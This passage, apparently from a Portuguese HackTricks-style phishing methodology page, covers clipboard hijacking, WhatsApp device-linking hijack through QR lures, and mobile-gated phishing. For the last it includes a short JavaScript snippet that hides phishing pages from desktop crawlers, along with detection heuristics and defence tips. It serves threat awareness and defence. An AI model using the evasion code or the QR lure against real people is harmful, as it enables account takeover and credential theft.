Atacantes podem copiar silenciosamente comandos maliciosos para a área de transferência da vítima a partir de uma página da Web comprometida ou com typosquatting e, em seguida, induzir o usuário a colá-los dentro do **Win + R**, **Win + X** ou de uma janela de terminal, executando código arbitrário sem qualquer download ou anexo.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing móvel e distribuição de aplicativos maliciosos (Android e iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Sequestro de vinculação de dispositivo do WhatsApp via engenharia social com QR
* Uma página-isca (por exemplo, um “canal” falso de ministério/CERT) exibe um QR do WhatsApp Web/Desktop e instrui a vítima a escaneá-lo, adicionando silenciosamente o atacante como um **dispositivo vinculado**.<sup>[[12]](#references)</sup>
* O atacante obtém imediatamente visibilidade dos chats/contatos até que a sessão seja removida. As vítimas podem posteriormente ver uma notificação de “novo dispositivo vinculado”; defensores podem procurar eventos inesperados de vinculação de dispositivos logo após visitas a páginas de QR não confiáveis.

### Phishing condicionado a dispositivos móveis para evitar crawlers/sandboxes
Os operadores estão cada vez mais condicionando seus fluxos de phishing a uma simples verificação do dispositivo, para que crawlers de desktop nunca alcancem as páginas finais. Um padrão comum é um pequeno script que verifica a existência de um DOM compatível com toque e envia o resultado para um endpoint do servidor; clientes que não são móveis recebem HTTP 500 (ou uma página em branco), enquanto usuários móveis recebem o fluxo completo.<sup>[[7]](#references)</sup>

Trecho mínimo do cliente (lógica típica):
```html
<script src="/static/detect_device.js"></script>
```
Lógica de `detect_device.js` (simplificada):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento do servidor frequentemente observado:
- Define um cookie de sessão durante o primeiro carregamento.
- Aceita `POST /detect {"is_mobile":true|false}`.
- Retorna 500 (ou um placeholder) para GETs subsequentes quando `is_mobile=false`; serve phishing somente quando `true`.

Heurísticas de hunting e detecção:
- Consulta no urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequência de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para dispositivos não móveis; caminhos legítimos de vítimas móveis retornam 200 com HTML/JS subsequente.
- Bloqueie ou analise detalhadamente páginas que condicionem o conteúdo exclusivamente a `ontouchstart` ou verificações semelhantes do dispositivo.

Dicas de defesa:
- Execute crawlers com fingerprints semelhantes aos de dispositivos móveis e JS habilitado para revelar conteúdo condicionado.
- Gere alertas para respostas 500 suspeitas após `POST /detect` em domínios registrados recentemente.

## References

- [1] [Geração de variações de domínio usadas em phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Encontrando phishing: ferramentas e técnicas (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Roube credenciais e ignore 2FA usando noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Roubo de sessões e bypass de 2FA com EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Como instalar e configurar DKIM com Postfix no Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Relatório global de resposta a incidentes de 2025 da Unit 42 – edição de engenharia social](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infraestrutura de phishing condicionada a dispositivos móveis e heurísticas (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [A próxima fronteira dos ataques de montagem em runtime: uso de LLMs para gerar JavaScript de phishing em tempo real](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Personificação, sequestro de cliques e TDS: por dentro de um ecossistema de distribuição de malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting de Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Sequestro de tráfego para o windows.com da Microsoft com inversão de bits (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Amor? Na verdade: aplicativo de namoro falso usado como isca em campanha direcionada de spyware no Paquistão](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs e amostras do ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
